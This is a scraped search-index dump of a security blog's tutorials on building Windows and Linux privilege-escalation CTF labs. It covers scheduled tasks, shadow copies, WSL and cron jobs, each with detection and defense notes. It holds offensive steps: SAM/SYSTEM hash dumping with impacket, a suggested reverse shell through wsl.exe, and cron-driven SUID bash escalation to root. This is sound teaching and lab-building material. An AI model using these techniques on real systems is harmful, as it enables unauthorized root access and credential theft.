\u003cInstall\u003e \u003cArguments Value=\"\"\u003e \u003cUILevelNone Value=\"\" /\u003e \u003cUILevelBasic Value=\"\" /\u003e \u003cUILevelReduced Value=\"\" /\u003e \u003cUILevelFull Value=\"\" /\u003e \u003c/Arguments\u003e \u003cRunBeforeInstall Value=\"\" /\u003e \u003cRunAfterInstall Value=\"\" /\u003e \u003c/Install\u003e \u003cUninstall\u003e \u003cArguments Value=\"\"\u003e \u003cUILevelNone Value=\"\" /\u003e \u003cUILevelBasic Value=\"\" /\u003e \u003cUILevelReduced Value=\"\" /\u003e \u003cUILevelFull Value=\"\" /\u003e \u003c/Arguments\u003e \u003c/Uninstall\u003e \u003c/WrappedInstaller\u003e \u003c/MsiWrapper\u003e Then we’re gonna execute MSI Wrapper and click on Load Settings: MSI Wrapper\rOpen the configuration file: ","date":"2022-03-20","objectID":"/windows-privesc-registry/:0:0","tags":["registry hives","alwaysinstallelevated","autorun","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Registry Hives for CTF Creators","uri":"/windows-privesc-registry/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Scheduled Tasks","date":"2022-03-20","objectID":"/windows-privesc-scheduled-tasks/","tags":["scheduled tasks","insecure scheduled tasks","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators","uri":"/windows-privesc-scheduled-tasks/"},{"categories":["Windows Local Privilege Escalation"],"content":"Scheduled Tasks Scheduled tasks, as the name implies, are tasks that are scheduled to be executed at specific time intervals. These tasks can be configured using Windows’ built-in Task Scheduler service. This service can monitor the time or event criteria that we choose and then execute the task when those criteria are met. The Task Scheduler is automatically installed in multiple Microsoft operating systems: Task Scheduler 1.0: Installed with Windows Server 2003, Windows XP, and Windows 2000 operating systems. Task Scheduler 2.0: Installed with Windows Vista and Windows Server 2008. The official documentation has following details: Tasks can be scheduled to execute in response to these events, or triggers. When a specific system event occurs. At a specific time. At a specific time on a daily schedule. At a specific time on a weekly schedule. At a specific time on a monthly schedule. At a specific time on a monthly day-of-week schedule. When the computer enters an idle state. When the task is registered. When the system is booted. When a user logs on. When a Terminal Server session changes state. ","date":"2022-03-20","objectID":"/windows-privesc-scheduled-tasks/:0:0","tags":["scheduled tasks","insecure scheduled tasks","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators","uri":"/windows-privesc-scheduled-tasks/"},{"categories":["Windows Local Privilege Escalation"],"content":"Task The documentation specifies the following: The following list contains a brief description of each task component: Triggers: Task Scheduler uses event or time-based triggers to know when to start a task. Every task can specify one or more triggers to start the task. For more information about triggers, see [Task Triggers](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-triggers).\rActions: These are the actions, the actual work, that is performed by the task. Every task can specify one or more actions to complete its work. For more information about actions, see Task Actions. Principals: Principals define the security context in which the task is run. For example, a principal might define a specific user or user group that can run the task. For more information about principals, see Security Contexts for Tasks. Settings: These are the settings that the Task Scheduler uses to run the task with respect to conditions that are external to the task itself. For example, these settings can specify the priority of the task with respect to other tasks, whether multiple instances of the task can be run, how the task is handled when the computer is in an idle condition, and other conditions. Based on the descriptions above, we’re interested in the principal (security context) in which a task is executed. If a tasks can be modified/edited but it runs high privileges, it could be leveraged to elevate our privileges. Configuration Create a directory to store tasks. md \"C:\\Schedule\" Grant full permissions to Authenticated Users groups on the directory. icacls \"C:\\Schedule\" /grant \"Autheticated Users:F\" Enable remote unsigned scripts and signed scripts downloaded from the Internet. This command must executed as administrator. powershell.exe /c Set-ExecutionPolicy remotesigned Create a PowerShell script. Write-Host \"Hello World!\" \u003e HelloWorld.ps1 Privilege Escalation via Scheduled Tasks Using the command line, we can view information that is nearly identical and list the scheduled tasks: PS C:\\Users\\user\u003e schtasks /query /fo LIST /v Folder: \\ HostName: desktop-bn TaskName: \\OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001 Next Run Time: 3/8/2022 1:50:48 PM Status: Ready Logon Mode: Interactive only Last Run Time: 3/7/2022 1:51:33 PM Last Result: 0 Author: Microsoft Corporation Task To Run: %localappdata%\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe /reporting Start In: N/A Comment: N/A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Stop On Battery Mode Run As User: user Delete Task If Not Rescheduled: Disabled Stop Task If Runs X Hours and X Mins: 02:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: One Time Only, Hourly Start Time: 1:50:48 PM Start Date: 3/3/2022 End Date: N/A Days: N/A Months: N/A Repeat: Every: 24 Hour(s), 0 Minute(s) Repeat: Until: Time: None Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled \u003c...SNIP...\u003e PS C:\\Users\\user\u003e schtasks /query /fo TABLE /nh Folder: \\ OneDrive Reporting Task-S-1-5-21-2640942 3/8/2022 1:50:48 PM Ready OneDrive Standalone Update Task-S-1-5-21 3/8/2022 3:29:47 PM Ready Folder: \\Microsoft INFO: There are no scheduled tasks presently available at your access level. \u003c...SNIP...\u003e Alternatively, we can also enumerate the scheduled tasks using PowerShell: PS C:\\Users\\user\u003e Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State TaskName TaskPath State -------- -------- ----- OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001 \\ Ready OneDrive Standalone Update Task-S-1-5-21-264094270-2388996790-3434637240-1001 \\ Ready \u003c...SNIP...\u003e Alternatively, we could also use autorunsc.exe from SysInternals: PS C:\\Users\\user\u003e C:\\Tools\\SysinternalsSuite\\autorunsc64.exe -a t | more Sysinternals Autoruns v14.09 - Autostart program viewer Copyright (C) 2002-2022 Mark Russinovich Sysinternals - www.sysinternals.com Task Scheduler \\OneDrive Reporting Task","date":"2022-03-20","objectID":"/windows-privesc-scheduled-tasks/:1:0","tags":["scheduled tasks","insecure scheduled tasks","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators","uri":"/windows-privesc-scheduled-tasks/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Shadow Copies","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Shadow Copies The Volume Shadow Copy Service (VSS), which was introduced in Windows Server 2003, is known by multiple names: Volume Shadow Copy Service Volume Snapshot Service (VS) Shadow Copies Shadow Copies (also known as Volume Snapshot Service, Volume Shadow Copy Service or VSS) are snapshots or copies of computer volumes and files. Therefore, Shadow Copies are used to create backups of a system manually or automatically. These can then be restored. The problems lies in the fact that if we gained administrator privileges we could gather sensitive files which may contain sensitive information. Lab Information This lab was created and tested on the following environment: Target Operating System Attacking Operating System Network Class Virtualization Environment Windows 11 Enterprise Evalution Edition Kali Linux 2021.4 IPv4 Class C VMware Workstation 17.0 Pro The date of this writing. ![[date.png]] Windows operating system version. ![[winver.png]] Windows updates information. ![[hotfix.png]] Configuration Open System Properties with the sysdm.cpl command. ![[sysdm.png]] Click on the System Protection tab. ![[system-protection-tab.png]] Click on the Configure button. ![[configure-button.png]] Enable system protection and configure the max usage. ![[turn-on-system-protection.png]] Apply the changes and click on the Create button. ![[create-restore-point.png]] Create a backup name. ![[restore-point-name.png]] Then it’ll start creating the restore point. ![[creating-a-restore-point.png]] Once it has completed, we’ll receive a window prompt. ![[restore-point-was-created.png]] Alternatively, we could create a backup of a C:\\ with WMIC. wmic shadowcopy call create volume='C:\\' ![[wmic-shadow-copy.png]] Working with Shadow Copies We can list shadow copies using vssadmin. However, we need administrator privileges. vssadmin list shadows ![[vssadmin-list-shadows.png]] If we want to delete a restore point/shadow. We can do it again using System Properties. ![[delete-restore-point-gui.png]] Alternatively, we could use vssadmin to delete a restore point/shadow. vssadmin delete shadows /Shadow={shadow copy ID} ![[vssadmin-delete-shadow.png]] Note: I used cmd.exe to execute the command above. If we want to delete all the restore points/shadows, we could also do it. vssadmin delete shadows /all ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/:0:0","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Symlink Shadow Copy We can create a symlink to access a shadow easily. mklink /d C:\\ShadowCopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\ ![[mklink-shadow-copy.png]] Note: In the image above, I didn’t use a backslash (\\) at the end of the command. This will throw an error the following error: C:\\Windows\\system32\u003ecd C:\\ShadowCopy The parameter is incorrect. We can fix this by removing the directory and creating a symlink with the backslash (\\) at the end. ![[shadow-copy-linked.png]] Privilege Escalation via Shadow Copies We’re looking for sensitive information such as credentials, memory dumps, or other. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/:1:0","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Dump SAM \u0026 SYSTEM Backups SAM and SYSTEM files cannot normally be accessed on an active system but they can be accessed in backups. They are commonly located in these directories: %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Once these files has been exfiltrated from the system, we could use impacket to crack them. impacket-secretsdump -sam SAM -system SYSTEM LOCAL ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/:2:0","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Others The creativity here is up to the adversary and what he/she can find. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/:3:0","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Detection We can log the command line events by configuring Group Policy. Take into consideration the following policies. Policy Path Setting Short Description Audit Process Creation Local Computer Policy -\u003e Computer Configuration -\u003e Windows Settings -\u003e Security Settings -\u003e Advanced Audit Policy Configuration -\u003e System Audit Policies -\u003e Detailed Tracking Success Logs every process that’s created Include command line in process creation events Local Computer Policy -\u003e Computer Configuration -\u003e Administrative Templates -\u003e System -\u003e Audit Process Creation Enabled Logs the command line commands and arguments Access to the following path is immediatly suspicious because it’s not common for a process to access shadow copies. \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy\u003cNumber\u003e Defense There are a few things that we could consider: Harden ACLs Avoid storing potential sensitive files that could be leveraged to elevate privileges Mitigation/Remediation Backups are really important for system administrators. Therefore, deleting backups it’s not recommended. One of the best solutions would be store backups in cold storage/offline storage. However, that might not always be an option. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-shadow-copies/:4:0","tags":["shadow copies","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Shadow Copies","uri":"/oscrapped_posts/windows-privesc-shadow-copies/"},{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - WSL","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Lab Information This lab was created and tested on the following environment: Target Operating System Attacking Operating System Network Class Virtualization Environment Windows 11 Enterprise Evalution Edition Kali Linux 2021.4 IPv4 Class C VMware Workstation 17.0 Pro The date of this writing. ![[date.png]] Windows operating system version. ![[winver.png]] Windows updates information. ![[hotfix.png]] Configuration Open PowerShell or Windows Command Prompt as administrator by right-clicking and selecting “Run as administrator” and enter the following command. wsl --install During the installation process, a UAC prompt may appear to install WSL in the system. ![[wsl-uac.png]] By default, it’ll attempt to install Ubuntu. ![[wsl-ubuntu.png]] After a system has been installed, it’ll finish the installation process. ![[wsl-installed.png]] Now, we need to reboot the system to apply the changes. Restart-Computer After rebooting the system we’ll wait a few seconds or minutes for the Ubuntu installation to complete. However, an error code 0x80370102 may appear. ![[installing-error.png]] According to the documentation, this error is described as the following: Error: 0x80370102 The virtual machine could not be started because a required feature is not installed. There are two fixes for this error: Use WSL version 1.0 Enable nested virtualization (Problem: It may not work with third party software) ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:0:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Method 1: WSL 1.0 (Recommended) However, changing WSL to version 1.0 is not straight forward. ![[wsl-version.png]] This error above happens because WSL installed but its optional component feature is not enabled . We can use PowerShell as administrator to enable it. Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux ![[wsl-enable-feature.png]] After the system has rebooted, we’ll open a PowerShell console and run the command again. wsl --set-default-version 1 ![[wsl-set-default-version.png]] This time around the operation completed successfully. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:1:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Method 2: Optional Features (Hyper-V Only) This steps apply to Hyper-V and not VMware. Therefore, we have to enabled the required feature which is Hyper-V. We can install this through optional features. We can launch the Windows Features program by running the following command. ![[optionalfeatures.png]] We can see that a few Hyper-V features are greyed out. ![[hyper-v-gray.png]] This is because this system has Second-Level Address Translation (SLAT) capabilites enabled. The solution to this issue is to enable nested virtualization with PowerShell as administrator. However, we’ll need a Hyper-V PowerShell module, which can be installed by selecting the following in your (host) system and not your (guest/VM) system. ![[hyper-v-powershell-module.png]] The following answer at Microsoft, specifies that we need to run the following command from host. Again this command is runned from your host and not your guest/VM. Set-VMProcessor -VMName \u003cVMName\u003e -ExposeVirtualizationExtensions $true Enable Virtual Machine Platform feature. This enables virtualization support for the current system. dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart ![[virtualmachineplatform.png]] After enabling this feature, we’ll need to reboot the system to apply the changes. Restart-Computer Ensure that the hypervisor is enabled in our boot configuration. ![[boot-configuration.png]] If this didn’t solve this error for you, please visit the following documentations: Error link: https://learn.microsoft.com/en-us/windows/wsl/troubleshooting#error-0x80370102-the-virtual-machine-could-not-be-started-because-a-required-feature-is-not-installed Nested virtualization link: https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/user-guide/nested-virtualization#configure-nested-virtualization ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:2:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Installing Ubuntu in WSL Now we’ll install Ubuntu in our WSL. wsl --install -d ubuntu ![[wsl-ubuntu-launch.png]] I’m going to enter a new UNIX username. ![[wsl-ubuntu-setup.png]] The password will be easypass. ![[wsl-passwords.png]] When the password don’t match, you’re allowed to input them again. ![[wsl-linux.png]] The installation is now done. The credentials that I used for this WSL system are the following: Username: user-wsl Password: easypass Interacting with WSL We have installed Ubuntu in WSL. We can use it in many ways. In this section, we’ll go over a few common methods in which we can use this image. When WSL is installed, it’ll create an executable in the system, which is to be expected. ![[where-wsl.png]] When a Linux distribution is installed, it’ll also install some components outside the image such as bash. ![[where-bash.png]] Because this executables are outside the image, we can use them from our host. ![[wsl-ip.png]] we can learn more about WSL commands in the documentation: https://learn.microsoft.com/en-us/windows/wsl/basic-commands Privilege Escalation via WSL ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:3:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Configuration If the default user of WSL image is root, it’ll immediatly make it vulnerable to “privilege escalation” since we’ll land as root. This can be configured from a Command Prompt or PowerShell console running as administrator. ubuntu.exe config --default-user root ![[wsl-default-user.png]] As we saw in the previous section, the default user was low-wsl but now it’s root. ![[wsl-whoami.png]] This means that we literally interact as the root user. ![[wsl-bash.png]] ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:4:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Enumeration What information do we need to find? If WSL is installed and enabled The WSL Linux distribution WSL default user We can if WSL is installed, enabled, and its Linux images with one command. wsl --list --verbose ![[wsl-list.png]] It also tells us its WSL version, which is great. Now we need information about its default user. wsl whoami ![[wsl-whoami-root.png]] The WSL system default user is root. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:5:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Attack The attack can be done in multiple ways and its all on the hands of the adversary. In this case, we could either use wsl or bash to execute an implant. This implant is up to the users creativity. wsl.exe \u003cimplant\u003e If you’re using this in a CTF, we may use a reverse shell. wsl.exe \u003creverse_shell_code/command\u003e A few TTPs that can be done with WSL can be any of the following: Installing Utilities Installing adversary Distributions Hijack Execution Flow by Redirecting to Linux Utilities WSL also allows us to mix Linux and Windows utilities. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:6:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Windows Local Privilege Escalation"],"content":"Detection We can log the command line events by configuring Group Policy. Take into consideration the following policies. Policy Path Setting Short Description Audit Process Creation Local Computer Policy -\u003e Computer Configuration -\u003e Windows Settings -\u003e Security Settings -\u003e Advanced Audit Policy Configuration -\u003e System Audit Policies -\u003e Detailed Tracking Success Logs every process that’s created Include command line in process creation events Local Computer Policy -\u003e Computer Configuration -\u003e Administrative Templates -\u003e System -\u003e Audit Process Creation Enabled Logs the command line commands and arguments Additonally, EDR systems may be to use MITRE ATT\u0026CK techniques IDs to identify suspicious behaviours. A few techniques are documented in MITRE: Indirect Command Execution: https://attack.mitre.org/techniques/T1202/ Defense These are few defenses that we could implement in our current WSL configuration: Change the default user to a user privilege user. Disable WSL (if possible). Create a restricted bash such as rbash as the default shell. This would limit the commands that a particular user can execute. Migitation/Remediation The most straight remediation to this problem is to disable WSL with the following PowerShell cmdlet: Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux Alternatively, it can de disabled with DISM. dism.exe /online /disable-feature /featurename:Microsoft-Windows-Subsystem-Linux It could also be also disabed by unchecking the Windows Subsystem for Linux in Windows Features. This can launched using the optionalfeatures command. ![[wsl-subsystem.png]] Additionally, Windows Features can disabled in the following registry paths: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Programs HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Programs The setting that needs to be changed is NoWindowsFeatures value to one (1). This one is not recommended as it may affect production systems. ","date":"2022-03-20","objectID":"/oscrapped_posts/windows-privesc-wsl/:7:0","tags":["wsl","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - WSL","uri":"/oscrapped_posts/windows-privesc-wsl/"},{"categories":["Linux Privilege Escalation"],"content":"Cron Jobs Cron jobs are scheduled task which are used to automate specific task at specific time intervals. Cron tables (crontabs) store the configuration of these cron jobs. These can be configured to run as high privileged users or groups. However, if they are misconfigured, it can lead to elevation of privilege. Cron Jobs Syntax Here is the syntax of a cron job: # Example of job definition:​ # .---------------- minute (0 - 59)​ # | .------------- hour (0 - 23)​ # | | .---------- day of month (1 - 31)​ # | | | .------- month (1 - 12) OR jan,feb,mar,apr ...​ # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat​ # | | | | |​ # * * * * * user-name command to be executed Cron Jobs Symbols These are the meaning of each symbol: Symbol Value * Any value , Value list separator - Range of values / Step of values Cron Jobs Generator Crontab generators can be used to automate the process of creating a cron job: crontab guru Crontabs Tables Crontab table syntax: Minute Hour Day Of Month Month Day Of Week 0-59 0-23 1-31 1-12 0-7 * * * * * 12,46 1,2,20 7,29 MAR,AUG 3,5 34-56/2 6-12 7-14 3-8 MON-FRI Run every minute: Minute Hour Day Of Month Month Day Of Week * * * * * Run every hour on the hour: Minute Hour Day Of Month Month Day Of Week 0 * * * * Run every five minutes: Minute Hour Day Of Month Month Day Of Week */5 * * * * Run at 9:30 AM on every Monday and Friday: Minute Hour Day Of Month Month Day Of Week 30 9 * * MON-FRI Configuring Crontabs We can list the current crontabs with the following command: user@pwn:~$ crontab -l no crontab for user We can edit the default crontab text editor with the following: crontab -e The select-editor can also be used: select-editor We can remove a crontab with the following: crontab -r We can add a crontab from a specific user: crontab -u username -e We could also remove a crontab for a specific user: crontab -u username -r ","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:0:0","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"Restarting Crontabs After making changes to the cron configuration file, we need to restart the cron daemon for the changes to take effect. The command to restart the cron daemon varies based on the specific Unix-like system you are using. Common commands include: service cron restart systemctl restart cron /etc/init.d/cron restart ","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:1:0","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"Allow/Deny Users \u0026 Groups Open the cron configuration file. This file is typically located in /etc and may be named cron.allow or cron.deny as shown below: /etc/cron.deny /etc/cron.allow Then we’ll need to add the usernames or group names that you want to allow in the appropriate file. Each entry should be placed on a separate line. Then we can save the changes and exit the file. ","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:2:0","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"System-Wide Crontab The system-wide crontab is located at /etc/crontab. We can view the contents of the system-wide crontab, and notice how the user column is available: user@pwn:/tmp$ ls -l /etc/crontab -rw-r--r-- 1 root root 722 Apr 5 2016 /etc/crontab user@pwn:/tmp$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) # ","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:2:1","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"User-Wide Crontab Each crontab that we create is located in the /var/spool/cron/crontabs directory and by default will be named as the username of the user who owns the crontab: user@pwn:/tmp$ sudo ls -lahR /var/spool/cron/crontabs [sudo] password for user: /var/spool/cron/crontabs: total 12K \u003cSNIP\u003e -rw------- 1 user crontab 1.3K Nov 20 10:50 user sudo cat /var/spool/cron/crontabs/user Then we could delete the crontab file: crontab -r ","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:2:2","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"Crontab Syslog Depending on the system distribution and the system configuration. The logs may stored in one of the following locations: /var/log/syslog /var/log/cron /var/log/messages /var/log/cron.log Note: The actual log file and its location can be customized based on system configurations. Therefore, it’s recommended to consult the system’s documentation. Crontabs events are logged with the following syntax: user@pwn:/tmp$ grep cron /var/log/syslog | tail -n 5 \u003cSNIP\u003e pwn crontab[9655]: (user) LIST (user) \u003cSNIP\u003e pwn crontab[10442]: (user) BEGIN EDIT (user) \u003cSNIP\u003e pwn crontab[10442]: (user) REPLACE (user) \u003cSNIP\u003e pwn crontab[10442]: (user) END EDIT (user) \u003cSNIP\u003e pwn cron[794]: (user) RELOAD (crontabs/user) Privilege Escalation via System-Wide Crontab Make a script that outputs the user’s security context: vim /tmp/elevate.sh To extract user information, add the following code: #!/bin/bash id \u003e /tmp/user_security_context.txt whoami \u003e\u003e /tmp/user_security_context.txt Add execution rights to the script so that it can be run by the cron job: chmod +x /tmp/elevate.sh Edit the system-wide crontab: sudo vim /etc/crontab Add the following code to the crontab: * * * * * root /tmp/elevate.sh In summary, this may end up as the following: user@pwn:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab we don't have to run the `crontab' # command to install the new version when we edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / \u0026\u0026 run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026\u0026 run-parts --report /etc/cron.monthly ) * * * * * root /tmp/elevate.sh # Wait one minute: watch -n 1 ls -l /tmp Ctrl+C Read the user_security_context.txt file: user@pwn:/tmp$ cat /tmp/user_security_context.txt uid=0(root) gid=0(root) groups=0(root) root Add a setuid bit to the bash script: echo '#!/bin/bash\\nchmod +s /usr/bin/bash' \u003e\u003e /tmp/elevate.sh Wait one minute until the SUID bit is set to the bash executable: watch -n 1 ls -l /usr/bin/bash Then we can bash shell the setuid bit as the root user by passing the -p flag: ❯ bash -p We can confirm this by using id: bash-5.1# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),1000(user) Privelege Escalation via PATH Environment Variable Create a script in your home directory that adds an SUID bit to the bash executable: #!/bin/bash sudo chmod +s /usr/bin/bash Add execution permissions to the script: chmod +x elevate.sh Create a custom cron job to run the elevate.sh script as the root user once every minute: sudo vim /etc/cron.d/custom Set up the cron job: SHELL=/bin/bash PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin * * * * * root elevate.sh Note: The PATH variable starts with /home/user which is our user’s home directory. Wait a minute, then “root” will run the script “elevate.sh”: watch -n 1 ls -l /usr/bin/bash This output is what we want to get: -rwsr-sr-x Then we can bash shell the setuid bit as the root user by passing the -p flag: ❯ bash -p We can confirm this by using id: bash-5.1# id uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sa","date":"2021-12-28","objectID":"/linux-privesc-cron-jobs/:3:0","tags":["privilege escalation","cron jobs","crontabs","path hijacking","systemd-wide-crontab","defend"],"title":"Linux Privilege Escalation - Cron Jobs for CTF Creators","uri":"/linux-privesc-cron-jobs/"},{"categories":["Linux Privilege Escalation"],"content":"Groups Groups are a collection of user. However, if these groups are misconfigured by hacing wrong access control lists (ACLs), they can be abused to elevate privileges. Also in UNIX there are some specific groups that have a few capabilities that can be abused as well. Privilege Escalation via Sudo Group We’ll add the current user to the sudo group and reboot the system to apply the changes: sudo usermod -aG sudo user \u0026\u0026 reboot The following configuration is very common on sudo: # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL # Allow members of group admin to execute any command %admin ALL=(ALL:ALL) ALL The code above means that any user that belongs to the group sudo or admin can execute anything as sudo. If this is the case, we can just switch to the root user as long as we have the current user’s password: sudo su We can remove the current user from the sudo or the admin group but I’m not gonna do it: sudo gpasswd -d user sudo Reboot the system to apply the change: reboot Privilege Escalation via Pkexec Group Find the 